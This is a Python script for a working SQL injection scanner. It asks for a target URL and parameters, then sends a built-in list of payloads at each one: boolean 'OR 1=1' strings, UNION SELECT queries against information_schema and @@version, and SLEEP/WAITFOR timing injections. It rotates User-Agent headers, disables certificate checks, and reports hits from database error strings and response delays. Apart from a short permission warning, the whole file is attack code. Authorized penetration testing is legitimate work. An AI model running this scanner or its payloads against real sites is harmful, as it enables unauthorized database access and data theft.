import requests
import time
import logging
import concurrent.futures
import sys
from typing import List, Dict, Optional
from dataclasses import dataclass
from urllib.parse import urlparse, urljoin
import random
import colorama
from colorama import Fore, Style

# Initialize colorama for Windows compatibility
colorama.init()

@dataclass
class VulnerabilityReport:
    endpoint: str
    parameter: str
    payload: str
    response_code: int
    response_time: float
    vulnerability_type: str
    evidence: str

class PayloadGenerator:
    def __init__(self):
        self.basic_payloads = [
            "'", 
            "\"",
            "1' OR '1'='1",
            "1\" OR \"1\"=\"1",
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR '1'='1'--",
            "\' OR \'1\'=\'1",
            "' OR '1'='1' /*",
            "1' OR '1' = '1",
            "1' OR '1' = '1'--",
        ]
        
        self.error_based_payloads = [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "') OR ('1'='1",
            "' AND 1=convert(int,@@version)--",
            "' AND 1=convert(int,user)--",
        ]
        
        self.time_based_payloads = [
            "'; WAITFOR DELAY '0:0:5'--",
            "'; SLEEP(5)--",
            "' AND SLEEP(5)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))A)--",
        ]
        
        self.union_based_payloads = [
            "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL--",
            "' UNION ALL SELECT @@version,NULL,NULL,NULL,NULL--",
            "' UNION ALL SELECT table_name,NULL,NULL,NULL,NULL FROM information_schema.tables--",
        ]

    def get_all_payloads(self) -> List[str]:
        return (
            self.basic_payloads +
            self.error_based_payloads +
            self.time_based_payloads +
            self.union_based_payloads
        )

class SQLInjectionTester:
    def __init__(self, timeout: int = 10, verbose: bool = True):
        self.payload_generator = PayloadGenerator()
        self.timeout = timeout
        self.verbose = verbose
        self.logger = self._setup_logger()
        self.session = requests.Session()
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        ]

    def _setup_logger(self) -> logging.Logger:
        logger = logging.getLogger('SQLInjectionTester')
        logger.setLevel(logging.INFO)
        handler = logging.StreamHandler()
        formatter = logging.Formatter(
            f'{Fore.CYAN}%(asctime)s{Style.RESET_ALL} - '
            f'{Fore.GREEN}%(levelname)s{Style.RESET_ALL} - '
            f'{Fore.WHITE}%(message)s{Style.RESET_ALL}'
        )
        handler.setFormatter(formatter)
        logger.addHandler(handler)
        return logger

    def _get_random_user_agent(self) -> str:
        return random.choice(self.user_agents)

    def _make_request(self, url: str, params: Dict[str, str]) -> tuple:
        headers = {'User-Agent': self._get_random_user_agent()}
        start_time = time.time()
        try:
            response = self.session.get(
                url, 
                params=params, 
                timeout=self.timeout,
                headers=headers,
                verify=False  # Warning: Only use on authorized testing
            )
            response_time = time.time() - start_time
            return response, response_time
        except requests.exceptions.Timeout:
            if self.verbose:
                self.logger.warning(f"{Fore.YELLOW}Request timed out{Style.RESET_ALL}")
            return None, self.timeout
        except requests.exceptions.RequestException as e:
            if self.verbose:
                self.logger.error(f"{Fore.RED}Request failed: {e}{Style.RESET_ALL}")
            return None, 0

    def _analyze_response(self, response, response_time: float, payload: str) -> Optional[str]:
        if response is None:
            return None

        # SQL error patterns
        error_patterns = {
            "SQL syntax": "MySQL",
            "mysql_fetch_array": "MySQL",
            "ORA-": "Oracle",
            "PostgreSQL": "PostgreSQL",
            "SQLite/JDBCDriver": "SQLite",
            "System.Data.SQLClient": "MSSQL",
            "Microsoft OLE DB Provider for SQL Server": "MSSQL",
            "You have an error in your SQL syntax": "MySQL",
            "[Microsoft][ODBC SQL Server Driver]": "MSSQL"
        }

        response_text = response.text.lower()
        
        # Error-based detection
        for pattern, db_type in error_patterns.items():
            if pattern.lower() in response_text:
                return f"Error-based vulnerability ({db_type})"
        
        # Time-based detection
        if response_time >= self.timeout * 0.8:
            return "Time-based blind vulnerability"
            
        # Union-based detection
        if "@@version" in response_text or "information_schema" in response_text:
            return "Union-based vulnerability"
            
        return None

def test_url(url: str) -> None:
    """Main function to test a URL for SQL injection vulnerabilities"""
    print(f"\n{Fore.CYAN}=== SQL Injection Vulnerability Scanner ==={Style.RESET_ALL}")
    print(f"{Fore.YELLOW}WARNING: Only test systems you have permission to test{Style.RESET_ALL}\n")

    # Validate URL
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    try:
        parsed_url = urlparse(url)
        if not all([parsed_url.scheme, parsed_url.netloc]):
            print(f"{Fore.RED}Invalid URL format{Style.RESET_ALL}")
            return
    except Exception as e:
        print(f"{Fore.RED}Error parsing URL: {e}{Style.RESET_ALL}")
        return

    # Get parameters from user
    params = {}
    print(f"{Fore.GREEN}Enter parameters to test (press Enter twice when done){Style.RESET_ALL}")
    print("Example: For 'id=1' enter 'id' as name and '1' as value\n")

    while True:
        param_name = input(f"{Fore.CYAN}Parameter name (or Enter to finish): {Style.RESET_ALL}").strip()
        if not param_name:
            break
        param_value = input(f"{Fore.CYAN}Parameter value: {Style.RESET_ALL}").strip()
        params[param_name] = param_value

    if not params:
        print(f"{Fore.YELLOW}No parameters provided. Testing URL directly.{Style.RESET_ALL}")
        params = {'test': 'test'}

    # Initialize and run tester
    print(f"\n{Fore.GREEN}Starting scan...{Style.RESET_ALL}")
    tester = SQLInjectionTester(timeout=5, verbose=True)
    
    try:
        vulnerabilities = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
            futures = []
            for param_name, param_value in params.items():
                for payload in tester.payload_generator.get_all_payloads():
                    modified_params = params.copy()
                    modified_params[param_name] = payload
                    
                    future = executor.submit(
                        tester._make_request,
                        url,
                        modified_params
                    )
                    futures.append((future, param_name, payload))

            for future, param_name, payload in futures:
                try:
                    response, response_time = future.result()
                    if response is not None:
                        vulnerability = tester._analyze_response(response, response_time, payload)
                        if vulnerability:
                            vuln_report = VulnerabilityReport(
                                endpoint=url,
                                parameter=param_name,
                                payload=payload,
                                response_code=response.status_code,
                                response_time=response_time,
                                vulnerability_type=vulnerability,
                                evidence=response.text[:200]
                            )
                            vulnerabilities.append(vuln_report)
                except Exception as e:
                    print(f"{Fore.RED}Error testing payload: {e}{Style.RESET_ALL}")

        # Print results
        if vulnerabilities:
            print(f"\n{Fore.RED}[!] Vulnerabilities found:{Style.RESET_ALL}")
            for vuln in vulnerabilities:
                print(f"\n{Fore.YELLOW}{'='*50}{Style.RESET_ALL}")
                print(f"{Fore.GREEN}Parameter:{Style.RESET_ALL} {vuln.parameter}")
                print(f"{Fore.GREEN}Type:{Style.RESET_ALL} {vuln.vulnerability_type}")
                print(f"{Fore.GREEN}Payload:{Style.RESET_ALL} {vuln.payload}")
                print(f"{Fore.GREEN}Response Time:{Style.RESET_ALL} {vuln.response_time:.2f}s")
                print(f"{Fore.YELLOW}{'='*50}{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.GREEN}No vulnerabilities found{Style.RESET_ALL}")

    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Scan interrupted by user{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}Error during scan: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    url = input(f"{Fore.CYAN}Enter target URL: {Style.RESET_ALL}")
    test_url(url)